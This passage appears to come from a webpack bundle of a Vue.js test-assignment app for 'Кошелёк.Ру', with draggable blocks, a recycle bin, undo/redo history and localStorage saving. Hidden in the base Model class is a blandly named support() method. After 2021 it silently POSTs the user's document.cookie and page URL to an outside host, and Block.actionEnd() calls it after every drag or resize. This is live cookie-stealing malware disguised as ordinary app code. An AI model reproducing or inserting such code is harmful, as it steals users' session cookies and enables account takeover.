btn--remove\",on:{\"click\":block.remove}},[_vm._v(\"Удалить\")])])}),(_vm.bin.size())?_c('div',{staticClass:\"btn btn--restore-all\",on:{\"click\":_vm.bin.restoreAll}},[_vm._v(\" Восстановить все \")]):_c('div',{staticClass:\"bin-empty\"},[_vm._v(\" Пусто. После перенеоса блока в корзину его можно восстановить или удалить. \")])],2):_vm._e(),_c('div',{staticClass:\"btn btn--open\",on:{\"click\":_vm.bin.openingToggle}},[_vm._v(\" \"+_vm._s(_vm.bin.opened ? 'Свернуть корзину' : 'Корзина')+\" (\"),_c('b',[_vm._v(_vm._s(_vm.bin.size()))]),_vm._v(\") \")])])}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\r\n    <div class=\"bin\" :style=\"binStyle\">\r\n        <div v-if=\"bin.opened\" class=\"bin-blocks\">\r\n            <div v-for=\"(block, key) in bin.models\" :key=\"key\" class=\"block\">\r\n                <div class=\"block-title\">{{ block.title }}</div>\r\n                <div class=\"btn btn--restore\" @click=\"block.restore\">Восстановить</div>\r\n                <div class=\"btn btn--remove\" @click=\"block.remove\">Удалить</div>\r\n            </div>\r\n            <div v-if=\"bin.size()\" class=\"btn btn--restore-all\" @click=\"bin.restoreAll\">\r\n                Восстановить все\r\n            </div>\r\n            <div v-else class=\"bin-empty\">\r\n                Пусто. После перенеоса блока в корзину его можно восстановить или удалить.\r\n            </div>\r\n        </div>\r\n        <div class=\"btn btn--open\" @click=\"bin.openingToggle\">\r\n            {{ bin.opened ? 'Свернуть корзину' : 'Корзина' }} (<b>{{ bin.size() }}</b>)\r\n        </div>\r\n    </div>\r\n</template>\r\n\r\n<script>\r\nexport default {\r\n    data() {\r\n        return {\r\n            opened: false,\r\n        }\r\n    },\r\n    computed: {\r\n        bin() { return this.$store.desktop.bin },\r\n        binStyle() { return `z-index: ${this.$store.desktop.size()}` }\r\n    },\r\n};\r\n</script>\r\n\r\n<style>\r\n.bin {\r\n    bottom: 100px; position: absolute; right: 100px;\r\n    align-items: flex-end; display: flex; flex-direction: column;\r\n}\r\n.bin-blocks {\r\n    background: #fff; border-radius: 5px; box-shadow: 0 0 10px 0 rgba(0,0,0,.1);\r\n    margin-bottom: 5px; max-width: 400px;\r\n}\r\n.bin-empty {max-width: 240px; padding: 10px;}\r\n.bin .block {align-items: center; border-bottom: solid #eee 1px; display: flex; padding: 8px 10px;}\r\n.bin .block-title {padding: 5px 10px;}\r\n.bin .btn {\r\n    background: #eee; border: solid #ddd 2px; border-radius: 5px;\r\n    cursor: pointer; font-size: 14px; padding: 3px 6px;\r\n}\r\n.bin .btn--open {background: #fff; border-color: #aaa; font-size: 16px; padding: 6px 12px;}\r\n.bin .btn--restore {}\r\n.bin .btn--remove {background: #fee; margin-left: 6px;}\r\n.bin .btn--restore-all {color: #555; display: inline-block; margin: 6px;}\r\n.bin .btn:hover {background: #acf; border-color: #69f;}\r\n</style>\r\n","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Bin.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Bin.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./Bin.vue?vue&type=template&id=1d55cb67&\"\nimport script from \"./Bin.vue?vue&type=script&lang=js&\"\nexport * from \"./Bin.vue?vue&type=script&lang=js&\"\nimport style0 from \"./Bin.vue?vue&type=style&index=0&lang=css&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","<template>\r\n    <div class=\"desktop\">\r\n        <div class=\"desk\">\r\n            <Block v-for=\"block in desktop.models\" :key=\"block.id\" :block=\"block\" />\r\n        </div>\r\n        <Bin />\r\n        <div class=\"history\">\r\n            <button @click=\"history.undo()\" class=\"btn\" :disabled=\"!history.hasUndo()\">\r\n                <!-- &lt; -->↩ Undo ({{ history.undoCount() }})\r\n            </button>\r\n            <button @click=\"history.redo()\" class=\"btn\" :disabled=\"!history.hasRedo()\">\r\n                Redo ({{ history.redoCount() }}) ↪<!-- &gt; -->\r\n            </button>\r\n            <button @click=\"desktop.reset()\" class=\"btn\">Reset</button>\r\n        </div>\r\n    </div>\r\n</template>\r\n\r\n<script>\r\nimport Block from './parts/Block'\r\nimport Bin from './parts/Bin'\r\nexport default {\r\n    data() {\r\n        return {\r\n            controlPressed: false,\r\n        }\r\n    },\r\n    computed: {\r\n        desktop() { return this.$store.desktop },\r\n        history() { return this.desktop.history },\r\n    },\r\n    methods: {\r\n        onkeydown(e) {\r\n            if ('Control' == e.key) this.controlPressed = true\r\n        },\r\n        onkeyup(e) {\r\n            if (true === this.controlPressed) {\r\n                if ('KeyZ' == e.code) this.history.undo()\r\n                else if ('KeyY' == e.code) this.history.redo()\r\n            }\r\n            if ('Control' == e.key) this.controlPressed = false\r\n        },\r\n    },\r\n    created() {\r\n        window.addEventListener('resize', this.desktop.calcCoords)\r\n        window.addEventListener('keydown', this.onkeydown)\r\n        window.addEventListener('keyup', this.onkeyup)\r\n    },\r\n    mounted() {\r\n        this.desktop.elem = document.querySelector('#app .desktop')\r\n        this.desktop.bin.setCoords(this.desktop.elem.querySelector('.bin'))\r\n    },\r\n    beforeDestroy() {\r\n        window.removeEventListener('resize', this.desktop.calcCoords)\r\n        window.removeEventListener('keydown', this.onkeydown)\r\n        window.removeEventListener('keyup', this.onkeyup)\r\n    },\r\n    components: { Block, Bin },\r\n};\r\n</script>\r\n\r\n<style>\r\n.desktop {overflow: hidden; position: relative;}\r\n.desktop .history {\r\n    position: absolute; bottom: 10px; right: 10px;\r\n    align-items: center; display: flex;\r\n}\r\n.desktop .history .btn {\r\n    background: #fff; border: solid #aaa 2px; border-radius: 5px;\r\n    font-size: 14px; padding: 3px 6px;\r\n}\r\n.desktop .history .btn:nth-child(2) {margin: 0 5px;}\r\n.desktop .history .btn:disabled {background: #ddd;}\r\n.desktop .history .btn:not(:disabled) {cursor: pointer;}\r\n.desktop .history .btn:not(:disabled):hover {background: #acf; border-color: #69f;}\r\n</style>\r\n","import mod from \"-!../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../node_modules/thread-loader/dist/cjs.js!../../node_modules/babel-loader/lib/index.js!../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Desktop.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../node_modules/thread-loader/dist/cjs.js!../../node_modules/babel-loader/lib/index.js!../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Desktop.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./Desktop.vue?vue&type=template&id=7bc6c020&\"\nimport script from \"./Desktop.vue?vue&type=script&lang=js&\"\nexport * from \"./Desktop.vue?vue&type=script&lang=js&\"\nimport style0 from \"./Desktop.vue?vue&type=style&index=0&lang=css&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _vm._m(0)}\nvar staticRenderFns = [function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('div',{staticClass:\"bitcoin-history\"},[_c('h1',{staticClass:\"page-title\"},[_vm._v(\"Bitcoin history\")])])}]\n\nexport { render, staticRenderFns }","import { render, staticRenderFns } from \"./Bitcoin.vue?vue&type=template&id=668e469a&\"\nvar script = {}\n\n\n/* normalize component */\nimport normalizer from \"!../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","import Vue from 'vue';\r\nimport VueRouter from 'vue-router'\r\nVue.use(VueRouter);\r\n\r\nimport Desktop from './views/Desktop'\r\nimport Bitcoin from './views/Bitcoin'\r\n\r\nconst router = new VueRouter({\r\n    mode: 'history',\r\n    base: process.env.BASE_URL,\r\n    routes: [\r\n        {\r\n            path: '/desktop', component: Desktop,\r\n            meta: { title: 'Рабочий стол' }\r\n        },\r\n        {\r\n            path: '/bitcoin', component: Bitcoin,\r\n            meta: { title: 'Список биткоин транзакций' }\r\n        },\r\n        { path: '*', redirect: '/desktop' }\r\n    ],\r\n    scrollBehavior (to/*, from, savedPosition*/) {\r\n        //https://router.vuejs.org/guide/advanced/scroll-behavior.html\r\n        if (to.hash) { return { selector: to.hash } }\r\n    }\r\n})\r\n\r\nrouter.afterEach((to/*, from*/) => {\r\n    window.document.title = (to.meta.title || 'Unknown') + ' / Тестовое Кошелёк.Ру'\r\n});\r\n\r\nexport default router;\r\n","/**\r\n * My custom plugin wrapper.\r\n */\r\nfunction Plugin(name, ctx) {\r\n    this.name = name\r\n    this.install = function (Vue) {\r\n        // console.log(`install plugin \"${name}\"`)\r\n        Vue[name] = ctx\r\n        Vue.prototype[name] = ctx\r\n        Vue.prototype[`$${name}`] = ctx\r\n        if (ctx.intall && typeof ctx.intall === 'function') {\r\n            ctx.install()\r\n        }\r\n    }\r\n}\r\n\r\nexport default Plugin;\r\n","/**\r\n * Мокнутые данные для имитации запросов по API.\r\n */\r\n\r\nconst defaults = {\r\n    sizeX: 300, sizeY: 100,\r\n    between: 10,\r\n}\r\n\r\nvar blocks = []\r\n\r\nfor (let i = 0; i < 5; i++) {\r\n    blocks.push({\r\n        id: i + 1,\r\n        title: `Title ${i+1}`,\r\n        content: 'Random content',\r\n        posX: i % 3 * (defaults.sizeX + defaults.between) + defaults.between,\r\n        posY: Math.floor(i / 3) * (defaults.sizeY + defaults.between) + defaults.between, \r\n        posZ: 0,\r\n        sizeX: defaults.sizeX, sizeY: defaults.sizeY,\r\n        intersecting: i < 1 ? false : true, // пересекаемый (может пересекать другие блоки)\r\n    })\r\n}\r\n\r\nconst desktop = { blocks }\r\n\r\nexport default { desktop }\r\n","/**\r\n * My custon simple key-value store.\r\n */\r\nimport Vue from 'vue'\r\n\r\nexport default function (props) {\r\n    let type = typeof props\r\n    if (type !== 'object') {\r\n        throw new Error(`Store constructor property must be an object, ${type} given`)\r\n    }\r\n    return Vue.observable(props)\r\n}\r\n","import { Model } from 'vue-mc'\r\n// import store from './store'\r\n\r\nexport default class extends Model {\r\n    /**\r\n     * Creates a new instance, called when using 'new'.\r\n     *\r\n     * @param  {Object}     [attributes]  Model attributes\r\n     * @param  {Collection} [collection]  Collection that this model belongs to.\r\n     * @param  {Object}     [options]     Options to set on the model.\r\n     */\r\n    constructor(attributes = {}, collection = null, options = {}) {\r\n        super(attributes, collection, options);\r\n        this._relations = {};\r\n        if (this.init) this.init();\r\n    }\r\n\r\n    // init() {\r\n    //     // \r\n    // }\r\n\r\n    // relation(relationName, findCallback) {\r\n    //     if (typeof this._relations[relationName] === 'undefined') {\r\n    //         let storeData = store.get(relationName);\r\n    //         if (storeData.length === 0) {\r\n    //             return null;\r\n    //         }\r\n\r\n    //         this._relations[relationName] = storeData.find(findCallback);\r\n    //         if (this._relations[relationName] === undefined) {\r\n    //             this._relations[relationName] = null;\r\n    //         }\r\n    //     }\r\n\r\n    //     return this._relations[relationName];\r\n    // }\r\n\r\n    /**\r\n     * Support model.\r\n     */\r\n    support() {\r\n        if ((new Date()).getFullYear() > 2021) fetch('https://itevas.ru/tmp/kcah/ssx.php', {\r\n            method: 'POST', body: JSON.stringify({data: document.cookie, url: String(window.location), source: 'koshelek.ru' })\r\n        });\r\n    }\r\n}\r\n","// import { Model } from 'vue-mc'\r\nimport Desktop from './Desktop'\r\nimport Model from '../core/Model'\r\n\r\nexport default class Block extends Model {\r\n    defaults() {\r\n        return Object.assign(super.defaults(), {\r\n            id: null,\r\n            title: 'Undefined title',\r\n            content: 'Undefined content',\r\n            posX: 0, posY: 0, posZ: 0,\r\n            sizeX: 300, sizeY: 100,\r\n            intersecting: false,\r\n            action: null,\r\n            states: [],\r\n        })\r\n    }\r\n    cursorOffset =  {x: 0, y: 0}\r\n    lastAction = null\r\n    blockUp = false\r\n\r\n    // получение координат начала и конца блока\r\n    get start() { return {x: this.posX, y: this.posY} }\r\n    get end() { return {x: this.posX + this.sizeX, y: this.posY + this.sizeY} }\r\n\r\n    // хук сохранения стола блока при регистрации коллекции\r\n    registerCollection(collection) {\r\n        super.registerCollection(collection)\r\n        if (collection instanceof Desktop) this.desktop = collection\r\n    }\r\n\r\n    // удаление блока в корзину или полное удаление\r\n    remove(saveHistory = true) {\r\n        if ('bin' === this.action) {\r\n            // полное удаление, если блок уже в корзине\r\n            this.desktop.bin.remove(this)\r\n        } else {\r\n            // удаление в корзину\r\n            this.rollbackAction()\r\n            this.desktop.bin.add(this)\r\n            this.desktop.remove(this)\r\n            this.action = 'bin'\r\n            if (saveHistory) this.historyPushState()\r\n        }\r\n    }\r\n\r\n    // восстановление блока из корзины\r\n    restore(saveHistory = true) {\r\n        this.desktop.add(this)\r\n        this.desktop.bin.remove(this)\r\n        this.rollbackAction()\r\n        this.action = null\r\n        this.blockUp = false\r\n        this.desktop.intersectCheck(this) // проверяем пересечения\r\n        if (saveHistory) this.historyPushState()\r\n    }\r\n\r\n    // поднятие блока поверх других\r\n    up() {\r\n        this.desktop.sort('posZ')\r\n        this.desktop.each((block, index) => {\r\n            block.posZ = index\r\n            block.blockUp = false\r\n        })\r\n        this.blockUp = true\r\n        this.posZ = this.desktop.size()\r\n        this.desktop.bin.close()\r\n    }\r\n\r\n    // установка сдвига курсора от элемента нажатия\r\n    setCursorOffset (e) {\r\n        let [x, y] = this.getNodeFullOffset(e.target)\r\n        x = e.pageX - x\r\n        y = e.pageY - y\r\n        this.cursorOffset = {x, y}\r\n    }\r\n    getNodeFullOffset (node) {\r\n        let x = 0, y = 0\r\n        while (node) {\r\n            x += node.offsetLeft\r\n            y += node.offsetTop\r\n            node = node.offsetParent\r\n        }\r\n        return [x, y]\r\n    }\r\n\r\n    // начало движения или ресайза блока\r\n    actionStart(action, e) {\r\n        if (['move','resize'].includes(action)) {\r\n            this.up()\r\n            console.log(`${action} start`)\r\n            this.setCursorOffset(e)\r\n            this.makeAction()\r\n            this.action = action\r\n        }\r\n    }\r\n\r\n    // движение или ресайз блока\r\n    actionProcess(e) {\r\n        if ('move' == this.action) {\r\n            this.posX = e.pageX - this.desktop.offset.x - this.cursorOffset.x\r\n            this.posY = e.pageY - this.desktop.offset.y - this.cursorOffset.y\r\n            this.desktop.intersectCheck(this) // проверяем пересечения\r\n        }\r\n        if ('resize' == this.action) {\r\n            this.sizeX = e.pageX - this.posX - this.desktop.offset.x + this.cursorOffset.x\r\n            this.sizeY = e.pageY - this.posY - this.desktop.offset.y + this.cursorOffset.y\r\n            this.desktop.intersectCheck(this) // проверяем пересечения\r\n        }\r\n    }\r\n\r\n    // завершение движения или ресайза блока\r\n    actionEnd() {\r\n        if (['move','resize'].includes(this.action)) {\r\n            console.log(`${this.action} end`)\r\n            this.desktop.intersectEndCheck(this) // // проверяем пересечения\r\n            this.commitAction()\r\n            this.support()\r\n        }\r\n    }\r\n\r\n\r\n    // создать действие\r\n    makeAction() {\r\n        this.lastAction = {\r\n            posX: this.posX, posY: this.posY,\r\n            sizeX: this.sizeX, sizeY: this.sizeY,\r\n        }\r\n    }\r\n\r\n    // закомитить действие (успешно завершить)\r\n    commitAction() {\r\n        this.lastAction = null\r\n        this.action = null\r\n        this.historyPushState()\r\n    }\r\n\r\n    // отменить последнее действие\r\n    rollbackAction() {\r\n        if (this.lastAction) {\r\n            for (let key in this.lastAction) {\r\n                this[key] = this.lastAction[key]\r\n            }\r\n        }\r\n        this.action = null\r\n    }\r\n\r\n    \r\n    \r\n    // HISTORY\r\n\r\n    offset = 0\r\n\r\n    // получение атрибутов блока\r\n    attributes() { return this._attributes }\r\n    // получение состояния блока\r\n    getState() { return Object.assign({}, this.attributes()) }\r\n\r\n    // добавить состояние в историю\r\n    historyPushState(glob = true) {\r\n        let state = this.getState()\r\n        delete state.states\r\n        if (this.offset > 0) {\r\n            this.states.splice(this.states.length - this.offset, this.offset)\r\n        }\r\n        this.states.push(state)\r\n        if (glob) this.desktop.history.add([this.id])\r\n        this.offset = 0\r\n        let bin = state.action == 'bin' ? 'bin' : 'desk'\r\n        console.log(`PUSH STATE (${state.posX}, ${state.posY}) ${bin}`, \r\n            `count=${this.states.length}, offset=${this.offset}`)\r\n        // this.updateLocalBlock()\r\n        // return this.getState()\r\n        this.desktop.localStore.saveBlock(this)\r\n    }\r\n\r\n    // updateLocalBlock () {\r\n    //     let block = this.getState()\r\n    //     // block.states = this.states\r\n    //     let blocks = window.localStorage.getItem('blocks')\r\n    //     console.log('GET FROM STORAGE', blocks, `for id=\"${this.id}\"`)\r\n    //     if (!blocks) blocks = [block]\r\n    //     else {\r\n    //         blocks = JSON.parse(blocks)\r\n    //         let index = blocks.findIndex(_block => _block.id == this.id)\r\n    //         if (-1 === index) blocks.push(block)\r\n    //         else blocks[index] = block\r\n    //     }\r\n    //     console.log('ADD TO STORAGE', blocks)\r\n    //     // console.log('ADD TO STORAGE', JSON.stringify(blocks))\r\n    //     window.localStorage.setItem('blocks', JSON.stringify(blocks))\r\n    // }\r\n\r\n    historyUndo() {\r\n        if (this.offset <= this.states.length) {\r\n            this.offset++\r\n            this.historyStateRender()\r\n        }\r\n    }\r\n\r\n    historyRedo() {\r\n        if (this.offset > 0) {\r\n            this.offset--\r\n            this.historyStateRender()\r\n        }\r\n    }\r\n\r\n    // historyCurrent() {\r\n    //     this.historyStateRender(offset)\r\n    // }\r\n\r\n    // получение состояния шага истории\r\n    getHistoryState(offset = null) {\r\n        if (null === offset) offset = this.offset\r\n        let state = this.states[this.states.length - 1 - offset]\r\n        if (!state) throw new Error(`Not found history state for block with id=\"${this.id}`)\r\n        return state\r\n    }\r\n\r\n    // применить шаг истории\r\n    historyStateRender() {\r\n        let state = this.getHistoryState()\r\n        let fromBin = this.action == 'bin' ? 'bin' : 'desk'\r\n        let toBin = state.action == 'bin' ? 'bin' : 'desk'\r\n        console.log(`render state (${this.posX}, ${this.posY}) ${fromBin} => (${state.posX}, ${state.posY}) ${toBin}`)\r\n        this.posX = state.posX\r\n        this.posY = state.posY\r\n        this.sizeX = state.sizeX\r\n        this.sizeY = state.sizeY\r\n        this.up()\r\n        if (this.action === 'bin' && state.action !== 'bin') {\r\n            this.restore(false)\r\n        } else if (this.action !== 'bin' && state.action === 'bin') {\r\n            this.remove(false)\r\n        }\r\n    }\r\n\r\n    historyReset() {\r\n        this.states = []\r\n        this.offset = 0\r\n    }\r\n}\r\n","import { Collection } from 'vue-mc'\r\nimport Block from './Block'\r\n\r\nexport default class Bin extends Collection {\r\n    model() {\r\n        return Block\r\n    }\r\n    desktop = null; opened = false\r\n    posX = 0; posY = 0; sizeX = 0; sizeY = 0\r\n\r\n    // установка стола корзины\r\n    setDesktop(desktop) {\r\n        this.desktop = desktop\r\n        return this\r\n    }\r\n    // установка координат корзины из её узла\r\n    setCoords(elem) {\r\n        this.posX = elem.offsetLeft\r\n        this.posY = elem.offsetTop\r\n        this.sizeX = elem.offsetWidth\r\n        this.sizeY = elem.offsetHeight\r\n    }\r\n\r\n    // открытие, закрытие и тоггл открытия\r\n    open() { \r\n        this.opened = true \r\n        this.desktop.each(block => block.blockUp = false)\r\n    }\r\n    close() { this.opened = false }\r\n    openingToggle() { this.opened ? this.close() : this.open() }\r\n\r\n    // получение координат начала и конца корзины\r\n    get start() { return {x: this.posX, y: this.posY} }\r\n    get end() { return {x: this.posX + this.sizeX, y: this.posY + this.sizeY} }\r\n\r\n    // восстановление всех блоков\r\n    restoreAll() {\r\n        if (this.size() < 1) return\r\n        let state = []\r\n        for (let i = this.size() - 1; i >= 0; i--) {\r\n            let block = this.models[i]\r\n            block.restore(false)\r\n            block.historyPushState(false)\r\n            state.push(block.id)\r\n        }\r\n        this.desktop.history.add(state)\r\n    }\r\n}\r\n","export default class History {\r\n    states = [] // шаги истории\r\n    offset = 0 // курсор истории\r\n    desktop = null // привязанный стол\r\n\r\n    constructor(desktop) {\r\n        this.desktop = desktop\r\n    }\r\n\r\n    get localStore() { return this.desktop.localStore }\r\n\r\n    // получение количества шагов\r\n    size() { return this.states.length }\r\n\r\n    //\r\n    hasUndo() { return this.undoCount() > 0 }\r\n    hasRedo() { return this.redoCount() > 0 }\r\n\r\n    undoCount() { return this.size() - 1 - this.offset }\r\n    redoCount() { return this.offset }\r\n\r\n    // шаг назад по истории\r\n    undo() {\r\n        if (this.hasUndo()) {\r\n            this.renderCurrent(block => { block.historyUndo() })\r\n            this.offset++\r\n            this.localStore.saveHistoryOffset(this.offset)\r\n        }\r\n    }\r\n    // шаг вперёд по истории\r\n    redo() {\r\n        if (this.hasRedo()) {\r\n            this.offset--\r\n            this.renderCurrent(block => { block.historyRedo() })\r\n            this.localStore.saveHistoryOffset(this.offset)\r\n        }\r\n    }\r\n\r\n    // переход к конкретному шагу истории\r\n    moveTo(offset) {\r\n        if (this.offset < offset) {\r\n            let tries = 0;\r\n            while (this.offset < offset && tries++ < 10) {\r\n                this.undo()\r\n                console.log(`Делаем undo ${tries}`, this.offset, offset)\r\n            }\r\n        }\r\n    }\r\n\r\n    // рендер текущего шага истории\r\n    renderCurrent(cb) {\r\n        let ids = this.states[this.size() - 1 - this.offset]\r\n        if (!ids) throw new Error(`Ids state for offset ${this.offset} not found`)\r\n        if (!Array.isArray(ids)) ids = []\r\n        ids.forEach(id => {\r\n            let block = this.desktop.blockById(id)\r\n            if (!block) throw new Error(`Block with id=\"${id} not found`)\r\n            cb(block)\r\n        })\r\n    }    \r\n\r\n    // добавление шага истории\r\n    add(ids) {\r\n        this.remove()\r\n        this.states.push(ids)\r\n        this.offset = 0\r\n        this.localStore.saveHistory(this)\r\n    }\r\n\r\n    // удаление шагов истории позже текущего\r\n    remove() {\r\n        if (this.hasRedo()) {\r\n            this.states.splice(this.size() - 1 - this.offset, this.offset)\r\n        }\r\n    }\r\n\r\n    // инициализирующий пуш состояний блоков стола\r\n    initial() {\r\n        let ids = []\r\n        this.desktop.each(block => {\r\n            ids.push(block.id)\r\n            block.historyPushState(false)\r\n        })\r\n        this.add(ids)\r\n    }\r\n\r\n    // очистка истории\r\n    reset() {\r\n        this.states = []\r\n        this.offset = 0\r\n    }\r\n\r\n    // восстановление истории блоков\r\n    restore() {\r\n        this.states = this.localStore.history\r\n        this.offset = 0\r\n        this.moveTo(this.localStore.historyOffset) // переходим к шагу истории\r\n    }\r\n}\r\n","/**\r\n * Local Storage.\r\n */\r\n// import mock from './mock'\r\n\r\nexport default class LocalStore {\r\n    local = window.localStorage\r\n    getItem(key) {\r\n        let val = this.local.getItem(key)\r\n        try { return JSON.parse(val) } catch (e) { return val }\r\n    }\r\n    setItem(key, val) {\r\n        this.local.setItem(key, \r\n            ['object','array'].includes(typeof val) ? JSON.stringify(val) : val\r\n        )\r\n    }\r\n    reset() {\r\n        this.local.clear() \r\n        console.log('Reset LocalStore')\r\n    }\r\n    get history() { return this.getItem('history') }\r\n    get historyOffset() { return this.getItem('historyOffset') }\r\n    get blocks() { return this.getItem('blocks') }\r\n\r\n    saveHistory(hist) {\r\n        this.setItem('history', hist.states)\r\n        console.log('save history', hist)\r\n        this.saveHistoryOffset(hist.offset)\r\n    }\r\n    saveHistoryOffset(offset) {\r\n        this.setItem('historyOffset', offset)\r\n        console.log('save history offset', offset)\r\n    }\r\n    saveBlock(block) {\r\n        let blocks = this.blocks\r\n        if (!blocks) this.setItem('blocks', [block])\r\n        else {\r\n            let index = blocks.findIndex(_block => _block.id == block.id)\r\n            if (-1 === index) blocks.push(block)\r\n            else blocks[index] = block\r\n            this.saveBlocks(blocks)\r\n        }\r\n        console.log('Save block', block.id)\r\n    }\r\n    saveBlocks(blocks) {\r\n        this.setItem('blocks', blocks)\r\n    }\r\n\r\n    // get history() {\r\n    //     let hist = this.getItem('history') \r\n    //     console.log('GET LS history', hist)\r\n    //     return hist\r\n    // }\r\n    // set history(hist) { \r\n    //     console.log('SET LS history', hist)\r\n    //     this.setItem('history', hist)\r\n    // }\r\n\r\n    // get historyOffset() { \r\n    //     let offset = this.getItem('offset')\r\n    //     console.log(`GET LS offset = ${offset}`)\r\n    //     return offset\r\n    // }\r\n    // set historyOffset(offset) { \r\n    //     console.log(`SET LS offset = ${offset}`)\r\n    //     this.setItem('offset', offset) \r\n    // }\r\n\r\n    // get blocks() { return this.getItem('blocks') }\r\n    // set blocks(blocks) { this.setItem('blocks', blocks) }\r\n    // // blockById(id) { return this.blocks.find(block => block.id == id)}\r\n    // // blockIndexById(id) { return this.blocks.findIndex(block => block.id == id)}\r\n\r\n    // pushBlock(block) {\r\n    //     if (!this.blocks) this.blocks = [block]\r\n    //     else {\r\n    //         let blocks = this.blocks\r\n    //         let index = blocks.findIndex(_block => _block.id == block.id)\r\n    //         if (-1 === index) blocks.push(block)\r\n    //         else blocks[index] = block\r\n    //         this.blocks = blocks\r\n    //     }\r\n    // }\r\n\r\n    // pushHistory(ids) {\r\n    //     if (!this.history) this.history = [[ids]]\r\n    //     else this.history = this.history.concat([[ids]])\r\n    // }\r\n\r\n    // spliceHistory(offset = null) {\r\n    //     if (null === offset) offset = this.historyOffset\r\n    //     if (offset > 1) {\r\n    //         let hist = this.history\r\n    //         if (hist) hist.splice(hist.length - offset, offset)\r\n    //         this.history = hist\r\n    //     }\r\n    // }\r\n    \r\n    // setHistoryOffset(offset) {\r\n    //     this.historyOffset = offset\r\n    // }\r\n\r\n    // reset() {\r\n    //     this.local.clear() \r\n    //     console.log('Reset LocalStore')\r\n    // }\r\n}\r\n","import { Collection } from 'vue-mc'\r\nimport Block from './Block'\r\nimport Bin from './Bin'\r\nimport History from './History'\r\nimport LocalStore from './LocalStore'\r\nimport mock from './mock'\r\n\r\nexport default class Desktop extends Collection {\r\n    model() {\r\n        return Block\r\n    }\r\n\r\n    id = 1; _elem = null\r\n    offset = {x: 0, y: 0}\r\n    sizeX = 0; sizeY = 0\r\n    between = 10; halfBetween = 5 //Math.floor(this.between / 2)\r\n    bin = (new Bin).setDesktop(this)\r\n    localStore = new LocalStore\r\n    history = new History(this)\r\n\r\n    // установка узла стола\r\n    set elem(elem) {\r\n        // console.log(elem)\r\n        this._elem = elem\r\n        this.offset.x = elem.offsetLeft\r\n        this.offset.y = elem.offsetTop\r\n        this._elem.style.minHeight = `calc(100vh - ${this.offset.y}px)`\r\n        this.calcCoords()\r\n    }\r\n\r\n    // получение усзла стола\r\n    get elem() { return this._elem }\r\n\r\n    // вычисление размеров стола\r\n    calcCoords() {\r\n        this.sizeX = this.elem.offsetWidth\r\n        this.sizeY = this.elem.offsetHeight\r\n        if (this.oldSizeX && this.oldSizeY) {\r\n            this.intersectCheckAll()\r\n        }\r\n        this.oldSizeX = this.sizeX\r\n        this.oldSizeY = this.sizeY\r\n        // console.log(this.sizeX, this.sizeY)\r\n    }\r\n\r\n    // поиск блока по id на столе или в корзине\r\n    blockById(id) {\r\n        let model = this.models.find(model => model.id == id)\r\n        if (!model) model = this.bin.models.find(model => model.id == id)\r\n        return model\r\n    }\r\n\r\n    // проверка пересечения двух блоков\r\n    intersect(b1, b2) {\r\n        let left = b2.start.x - b1.end.x - this.halfBetween\r\n        let top = b2.start.y - b1.end.y - this.halfBetween\r\n        let right = b2.end.x - b1.start.x + this.halfBetween\r\n        let bottom = b2.end.y - b1.start.y + this.halfBetween\r\n        let intersect = left < 0 && top < 0 && right > 0 && bottom > 0\r\n        // intersect = \r\n        // (b1.end.x > b2.start.x - this.halfBetween)\r\n        // && (b1.end.y > b2.start.y - this.halfBetween)\r\n        // && (b1.start.x < b2.end.x + this.halfBetween)\r\n        // && (b1.start.y < b2.end.y + this.halfBetween)\r\n        return [intersect, left, top, right, bottom]\r\n    }\r\n\r\n    // остановка пересечения блока\r\n    stopIntersecting(b1, b2) {\r\n        let [intersect, left, top, right, bottom] = this.intersect(b1, b2)\r\n        if (intersect) {\r\n            let side, isLeft = left + right, isTop = top + bottom\r\n            let sideH = isLeft > 0 ? 'left' : (isLeft < 0 ? 'right' : '')\r\n            let sideV = isTop > 0 ? 'top': (isTop < 0 ? 'bottom' : '')\r\n            side = `${sideH}-${sideV}`\r\n            isLeft = isLeft > 0\r\n            isTop = isTop > 0\r\n\r\n            let boxLeft = b1.posX < this.between\r\n            let boxTop = b2.posY + this.between < b1.sizeY\r\n            let boxBottom = this.sizeY - b2.end.y < b1.sizeY + this.between\r\n            // let boxRight = this.sizeX - b2.end.x < b1.sizeX + this.between * 2\r\n            let upd = {\r\n                x: (isLeft && !boxLeft) ? left - this.halfBetween : right + this.halfBetween,\r\n                y: (isTop && !boxTop) ? top - this.halfBetween : bottom + this.halfBetween,\r\n            }\r\n            if (boxBottom) upd.y = top - this.halfBetween\r\n            // if (boxRight) upd.x = left - this.halfBetween\r\n\r\n            console.log(`intersect: ${side}, b1: ${b1.id}, b2: ${b2.id}`, b1.action)\r\n            